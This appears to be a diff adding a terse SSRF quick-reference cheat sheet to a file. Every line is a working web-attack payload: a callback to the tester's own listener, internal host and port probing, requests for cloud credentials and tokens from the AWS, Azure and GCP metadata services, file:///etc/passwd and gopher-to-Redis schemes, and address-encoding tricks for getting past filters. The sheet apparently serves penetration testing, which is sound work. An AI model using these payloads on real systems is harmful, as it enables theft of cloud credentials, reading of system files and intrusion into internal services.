@@ -1,0 +1,10 @@
+SSRF — QUICK REF
+
+Confirm:   ?url=http://<your-ip>/ssrftest   (watch your listener)
+Internal:  ?url=http://127.0.0.1/  |  http://<internal-ip>/  |  port-scan :22 :3306
+Metadata (crown jewel):
+  AWS  http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
+  Azure (Metadata:true)  .../metadata/identity/oauth2/token?...&resource=https://management.azure.com/
+  GCP (Metadata-Flavor:Google) http://metadata.google.internal/computeMetadata/v1/.../token
+Schemes:   file:///etc/passwd | gopher://127.0.0.1:6379/_<redis> | dict://
+Bypass:    127.1 | 0x7f000001 | [::1] | 169.254.169.254.nip.io | @ / # | redirect | DNS rebind
